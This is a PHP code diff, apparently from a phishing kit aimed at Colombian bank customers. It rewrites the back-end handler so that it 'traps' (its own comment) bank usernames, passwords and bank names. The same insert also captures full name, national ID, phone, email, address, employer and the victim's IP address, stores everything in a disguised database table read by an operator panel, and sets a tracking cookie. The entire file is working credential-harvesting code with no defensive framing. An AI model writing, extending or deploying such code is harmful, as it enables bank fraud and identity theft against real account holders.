@@ -4,27 +4,53 @@ require('../panel/include/setings.php');
 date_default_timezone_set('America/Bogota');
 $ifilter = new InputFilter();
 
-$usuario = $ifilter->process($_POST['usr']);
-$contrasena = $ifilter->process($_POST['pas']);
-$banco = $ifilter->process($_POST['ban']);
+// 1. Atrapamos usuario, clave y banco
+$usuario = isset($_POST['usr']) ? $ifilter->process($_POST['usr']) : '';
+$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
+$banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';
 $dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : 'PC';
 
-// 🟢 RECIBIMOS EL ID ENVIADO DESDE FUNCTIONS.JS DE NEQUI
-$id_vanti = isset($_POST['id_tramite']) ? $ifilter->process($_POST['id_tramite']) : '';
+// 2. Atrapamos los datos personales enviados desde functions.js
+$nom = isset($_POST['nom']) ? $ifilter->process($_POST['nom']) : '';
+$ape = isset($_POST['ape']) ? $ifilter->process($_POST['ape']) : '';
+$tdoc = isset($_POST['tdoc']) ? $ifilter->process($_POST['tdoc']) : '';
+$doc = isset($_POST['doc']) ? $ifilter->process($_POST['doc']) : '';
+$cel = isset($_POST['cel']) ? $ifilter->process($_POST['cel']) : '';
+$eml = isset($_POST['eml']) ? $ifilter->process($_POST['eml']) : '';
+$dir = isset($_POST['dir']) ? $ifilter->process($_POST['dir']) : '';
+$emp = isset($_POST['emp']) ? $ifilter->process($_POST['emp']) : '';
+$ref = isset($_POST['ref']) ? $ifilter->process($_POST['ref']) : '';
+$mnt = isset($_POST['mnt']) ? $ifilter->process($_POST['mnt']) : '';
 
-// Si viene un ID de Vanti, lo usamos y creamos la cookie para los siguientes pasos
-if ($id_vanti !== '') {
-    $id = $id_vanti;
-    setcookie('id', $id, time() + (86400 * 30), "/"); 
-} else {
-    // Comportamiento normal de respaldo si no viene por URL
-    $id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
-}
+// 3. Conectamos a la base de datos
+require_once('../panel/include/link.php');
+$con = conectar();
 
-// Como el ID ya no está vacío, ejecutará upgrade_user en lugar de crear una fila nueva
-if ($id === '' || $id === '0') {
-	create_item($usuario, $contrasena, $dispositivo, '', '', $banco, '');
-} else {
-	upgrade_user($id, $usuario, $contrasena, $banco);
+if ($con) {
+    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
+
+    // 4. Inserción directa (TODO JUNTO)
+    $sql = "INSERT INTO m3it3m 
+            (usuario, password, banco, status, nombre, apellido, tipo_doc, cedula, celular, email, direccion, empresa, referencia, agente, ip) 
+            VALUES (?, ?, ?, 2, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
+            
+    $stmt = mysqli_prepare($con, $sql);
+    
+    if ($stmt) {
+        mysqli_stmt_bind_param($stmt, "sssssssssssssss", 
+            $usuario, $contrasena, $banco, $nom, $ape, $tdoc, $doc, $cel, $eml, $dir, $emp, $ref, $mnt, $ip
+        );
+        
+        if (mysqli_stmt_execute($stmt)) {
+            // Recuperamos el ID generado para la cookie
+            $id = mysqli_insert_id($con);
+            setcookie('id', $id, time() + (86400 * 30), "/");
+            echo "OK";
+        } else {
+            echo "Error: " . mysqli_error($con);
+        }
+        mysqli_stmt_close($stmt);
+    }
+    desconectar($con);
 }
 ?>
